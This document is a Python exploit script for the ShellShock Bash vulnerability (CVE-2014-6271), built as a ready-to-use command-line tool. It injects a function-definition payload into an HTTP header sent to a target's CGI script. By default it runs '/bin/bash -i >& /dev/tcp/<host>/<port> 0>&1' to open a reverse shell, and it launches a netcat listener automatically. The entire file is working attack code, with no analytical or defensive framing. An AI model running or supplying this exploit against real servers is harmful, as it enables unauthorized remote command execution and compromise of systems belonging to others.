#!/usr/bin/python3
# ShellShock - Arbitrary Command Execution - Bash 1.14.0 < 4.3 

from argparse import ArgumentParser
from urllib.request import Request, urlopen
from subprocess import Popen
from time import sleep

def create_url(url:str, target:str) -> str:
    """Return complete url with target script."""
    if not url.startswith('http'): 
        url = f'http://{url}'
    print(url)

    if target is not None and not '/cgi-bin/' in url:
        target_split = target.split("/cgi-bin/")

        if len(target_split) > 1:
            print(f'Specified target: {target_split[1]}')
            return f'{url}/{target}'
        else: exit('Target not specified!')

    elif target is None and '/cgi-bin/' in url:
        target_split = url.split('/cgi-bin/')

        if len(target_split) > 1:
            print(f'Specified target: {target_split[1]}')
            return url
        else: exit('Target not specified!')
    else: exit('Target not specified!')

def create_payload(payload:str, cmd:str, lhost:str, lport:str) -> str:
    """Return assembled payload."""
    if lhost is not None: 
        return payload.replace('@', cmd.format(lhost, lport))
    else: return payload

def create_req(url:str, header:str, payload:str) -> Request:
    """Return assemble http request."""
    return Request(url=url, headers={f'{header}':payload}, method='GET')

def revshell(listener:str, lport:str) -> None:
    """Establish revshell."""
    try:
        Popen(listener.format(lport).split())
        urlopen(req)
        sleep(60*60*24)
    except KeyboardInterrupt: pass

if __name__ == '__main__':
    parser = ArgumentParser(
        prog='CVE-2014-6271',
        description='ShellShock - Arbitrary Command Execution - Bash 1.14.0 < 4.3  [CVE-2014-6271]',
        epilog='The reverse shell will be established automatically if required information is given.',
        usage='python3 CVE-2014-6271.py -lh <your-ip> -t </cgi-bin/vulnerable-script> url'
    )
    parser.add_argument('url', help='URL of target')
    parser.add_argument('--target', '-t', required=False, default=None, help='the /cgi-bin/<vulnerable> script')
    parser.add_argument('--lhost', '-lh', required=False, default=None, help='listen IP')
    parser.add_argument('--lport', '-lp', required=False, type=str, default='9001', help='listen port')
    parser.add_argument('--cmd', '-c', required=False, default='/bin/bash -i >& /dev/tcp/{}/{} 0>&1', help='command to execute, by default revshell')
    parser.add_argument('--header', '-H', required=False, type=str, default='user-agent', help='abused header')
    parser.add_argument('--payload', '-P', required=False, type=str, default='() { :; }; echo; echo; @', help='payload to abuse vulnerability')
    parser.add_argument('--listen', '-l', required=False, type=str, default='nc -vlnp {}', help='listener')
    args = parser.parse_args()

    url = create_url(args.url, args.target)
    payload = create_payload(args.payload, args.cmd, args.lhost, args.lport)
    req = create_req(url, args.header, payload)
    if args.lhost is not None:
        revshell(args.listen, args.lport)
    else:
        print(urlopen(req).read().decode())
